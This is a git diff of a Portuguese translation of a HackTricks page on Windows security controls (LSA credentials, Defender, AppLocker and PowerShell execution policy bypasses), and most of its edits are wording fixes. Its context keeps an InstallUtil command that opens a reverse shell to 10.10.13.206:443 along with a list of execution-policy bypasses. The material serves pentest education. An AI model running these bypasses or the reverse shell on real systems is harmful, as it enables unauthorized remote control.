@@ -12,7 +12,7 @@
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
 Acesse hoje:
@@ -65,7 +65,7 @@ As credenciais locais estão presentes neste arquivo, as senhas estão em format
 
 As **credenciais** (em formato de hash) são **salvas** na **memória** deste subsistema por motivos de Single Sign-On.\
 O LSA administra a **política de segurança** local (política de senha, permissões de usuários...), **autenticação**, **tokens de acesso**...\
-O LSA será responsável por **verificar** as credenciais fornecidas dentro do arquivo **SAM** (para um login local) e **conversar** com o **controlador de domínio** para autenticar um usuário de domínio.
+O LSA será o responsável por **verificar** as credenciais fornecidas dentro do arquivo **SAM** (para um login local) e **conversar** com o controlador de domínio para autenticar um usuário de domínio.
 
 As **credenciais** são **salvas** dentro do processo LSASS: tickets Kerberos, hashes NT e LM, senhas facilmente descriptografadas.
 
@@ -84,7 +84,7 @@ O LSA pode salvar em disco algumas credenciais:
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) é um Antivírus disponível no Windows 10, Windows 11 e em versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting como **`WinPEAS`**. No entanto, existem maneiras de **contornar essas proteções**.
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) é um antivírus disponível no Windows 10, Windows 11 e em versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting, como **`WinPEAS`**. No entanto, existem maneiras de **contornar essas proteções**.
 
 ### Verificação
 
@@ -201,9 +201,11 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 
 A técnica de shell reverso é usada para estabelecer uma conexão entre o atacante e a máquina alvo, permitindo ao atacante executar comandos remotamente no sistema comprometido. Isso é feito através da criação de um canal de comunicação reverso, onde o atacante age como um servidor e a máquina alvo como um cliente.
 
-Existem várias maneiras de implementar um shell reverso, incluindo o uso de ferramentas prontas, como o Netcat ou o Metasploit Framework. O processo geral envolve a exploração de uma vulnerabilidade ou a engenharia social para obter acesso ao sistema alvo e, em seguida, estabelecer uma conexão reversa para controlar o sistema remotamente.
+Existem várias maneiras de implementar um shell reverso, incluindo o uso de ferramentas prontas, como o Netcat ou o Metasploit Framework. O processo geral envolve a exploração de uma vulnerabilidade no sistema alvo e a execução de um payload que estabelece a conexão reversa.
 
-Uma vez que a conexão reversa é estabelecida, o atacante pode executar comandos no sistema alvo, como listar arquivos, obter informações do sistema, transferir arquivos, entre outros. Essa técnica é amplamente utilizada em testes de penetração e pode ser perigosa se usada de forma maliciosa, pois permite ao atacante obter controle total sobre o sistema comprometido. Portanto, é importante implementar medidas de segurança adequadas para proteger os sistemas contra ataques de shell reverso.
+Uma vez estabelecida a conexão reversa, o atacante pode enviar comandos para o sistema alvo e receber as respostas correspondentes. Isso permite ao atacante explorar ainda mais o sistema comprometido, executando comandos privilegiados, extraindo informações confidenciais ou até mesmo implantando malware adicional.
+
+É importante ressaltar que a utilização de shell reverso para fins maliciosos é ilegal e pode resultar em consequências legais graves. Esta técnica é discutida aqui apenas para fins educacionais e de conscientização sobre segurança.
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
@@ -211,7 +213,7 @@ Você pode usar o [**ReflectivePick**](https://github.com/PowerShellEmpire/Power
 
 ## Política de Execução do PS
 
-Por padrão, ela está definida como **restrita**. As principais maneiras de contornar essa política são:
+Por padrão, ela está definida como **restrita**. Principais maneiras de contornar essa política:
 ```powershell
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -262,11 +264,11 @@ O SSPI será responsável por encontrar o protocolo adequado para duas máquinas
 [uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
 {% endcontent-ref %}
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para criar e **automatizar fluxos de trabalho** com facilidade, usando as ferramentas comunitárias mais avançadas do mundo.\
-Acesse hoje:
+Acesse hoje mesmo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
